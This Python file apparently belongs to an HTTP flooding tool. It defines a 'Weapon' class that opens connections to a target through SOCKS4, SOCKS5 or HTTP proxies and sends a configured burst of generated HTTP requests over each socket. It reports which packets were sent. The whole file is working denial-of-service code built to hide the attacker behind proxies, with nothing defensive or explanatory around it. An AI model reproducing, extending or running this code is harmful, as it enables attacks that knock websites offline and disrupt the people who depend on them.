from files.obserbable import *
from files.requests_generator import *
from files.targets_manager import *
import socket
import socks
import ssl

class Weapon(Observable):
    def __init__(self, config):
        Observable.__init__(self)
        self.__config = config

    def create_socket_using_socks_proxy(self, target, proxy):
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        if proxy.TYPE == 'socks4':
            s.set_proxy(socks.SOCKS4, proxy.IP, int(proxy.PORT))
        elif proxy.TYPE == 'socks5':
            s.set_proxy(socks.SOCKS5, proxy.IP, int(proxy.PORT))
        else:
            raise Exception('Invalid proxy type')
        if target.PROTOCOL == 'https':
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.load_default_certs()
            s = ctx.wrap_socket(s, server_hostname = target.HOST)
        s.settimeout(self.__config.TIMEOUT)
        return s
    
    def simple_url_request_generator(self, target):
        return Requests.gen_http_request(target)

    def extended_url_request_generator(self, target):
        return Requests.gen_http_request(target, head=Requests.get_extended_head(target))

    def attack_url_with_socket(self, target, s, request_generator):
        try:
            for id in range(self.__config.MAX_SIMPLE_CONNECTION_REQUESTS):
                request = request_generator(target)
                sent = s.send(str.encode(request))
                if not sent:
                    self.notify(['packet was not sent'])
                else:
                    self.notify(['packet was sent', len(request)])
            s.close()
        except:
            self.notify(['packet was not sent'])
            s.close()

    def attack_url_socks(self, target, proxy):
        s = self.create_socket_using_socks_proxy(target, proxy)
        try:
            s.connect((target.HOST, int(target.PORT)))
            self.notify(['successfully connected to proxy'])
        except Exception as e:
            s.close()
            self.notify(['unable to connect to proxy'])
            return

        self.attack_url_with_socket(target, s, self.simple_url_request_generator)

    def attack_url_http(self, target, proxy):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.__config.TIMEOUT)
        try:
            s.connect((proxy.IP, int(proxy.PORT)))
            self.notify(['successfully connected to proxy'])
        except Exception as e:
            self.notify(['unable to connect to proxy'])
            return

        self.attack_url_with_socket(target, s, self.extended_url_request_generator)

    def attack_url_https(self, target, proxy):
        port = target.PORT
        if port == 443:
            port = 80
        self.attack_url_http(Target(target.HOST, port, target.PATH, 'http'), proxy)

    def attack_url_http_https(self, target, proxy):
        if target.PROTOCOL == 'http':
            self.attack_url_http(target, proxy)
        elif target.PROTOCOL == 'https':
            self.attack_url_https(target, proxy)
        else:
            raise Exception('Invalid proxy type')

    def attack_url(self, target, proxy):
        if proxy.TYPE in ['socks4', 'socks5']:
            self.attack_url_socks(target, proxy)
        elif proxy.TYPE in ['http']:
            self.attack_url_http_https(target, proxy)